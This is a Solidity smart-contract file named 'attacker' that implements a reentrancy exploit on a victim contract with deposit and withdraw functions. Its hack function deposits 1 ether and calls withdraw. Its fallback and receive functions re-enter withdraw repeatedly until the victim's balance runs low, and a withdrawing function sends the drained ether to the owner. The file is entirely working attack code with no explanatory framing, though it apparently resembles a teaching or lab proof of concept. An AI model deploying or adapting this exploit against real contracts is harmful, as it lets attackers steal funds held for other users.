//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Ivictim {
    function deposit() external payable;

    function withdraw() external;
}

contract attacker {
    Ivictim public victimContract;

    address immutable victimAddress;
    address immutable owner;

    constructor(address _victimContract) {
        victimContract = Ivictim(_victimContract);
        victimAddress = _victimContract;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    fallback() external payable {
        chekBalance(victimAddress);
    }

    receive() external payable {
        chekBalance(victimAddress);
    }

    function hack() external payable onlyOwner {
        require(msg.value >= 1 * 10**18, "Wrong value, it must be >= 1");
        victimContract.deposit{value: 1 * 10**18}();
        victimContract.withdraw();
    }

    function chekBalance(address _victim) internal {
        if (_victim.balance >= 1 * 10**18) {
            victimContract.withdraw();
        }
    }

    function withdrawing() external onlyOwner {
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}
